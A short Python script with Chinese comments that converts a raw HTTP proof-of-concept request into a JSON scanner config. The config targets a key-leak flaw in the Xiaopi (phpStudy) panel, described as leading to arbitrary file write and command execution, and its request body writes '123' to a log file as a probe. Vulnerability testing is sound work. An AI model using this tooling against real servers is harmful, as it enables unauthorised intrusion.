import json

# 文件路径
input_file = "raw_poc.txt"
output_file = "poc.json"

# 读取原始请求内容
with open(input_file, "r", encoding="utf-8") as f:
    raw_data = f.read().strip()

# 分离请求行、头部、正文
parts = raw_data.split("\n\n", 1)
header_block, body = parts if len(parts) == 2 else (raw_data, "")

lines = header_block.strip().splitlines()
method, url, _ = lines[0].split(" ", 2)
headers = {}

for line in lines[1:]:
    if ": " in line:
        key, value = line.split(": ", 1)
        headers[key] = value

# 构造最终 JSON 数据
output_data = {
    "targetName": "（国外）小皮 加密密钥泄露 导致任意文件上传任意文件修改任意命令执行 漏洞",
    "pocUrl": url,
    "whiteBoolean": "AND",
    "whiteList": ["1000"],
    "blackBoolean": "AND",
    "blackList": [],
    "threadingNum": 20,
    "waitTime": 5,
    "method": method,
    "headers": headers,
    "data": json.dumps({
        "pathname": "/xp/log/fatal/fatal.log",
        "content": "123",
        "encoding": "utf-8"
    }, ensure_ascii=False)
}

# 写入 JSON 文件
with open(output_file, "w", encoding="utf-8") as f:
    json.dump(output_data, f, indent=2, ensure_ascii=False)

print(f"已成功将 POC 转换为 JSON 格式并保存为 {output_file}")

def row_to_json():
    print()


if __name__ == '__main__':
    row_to_json()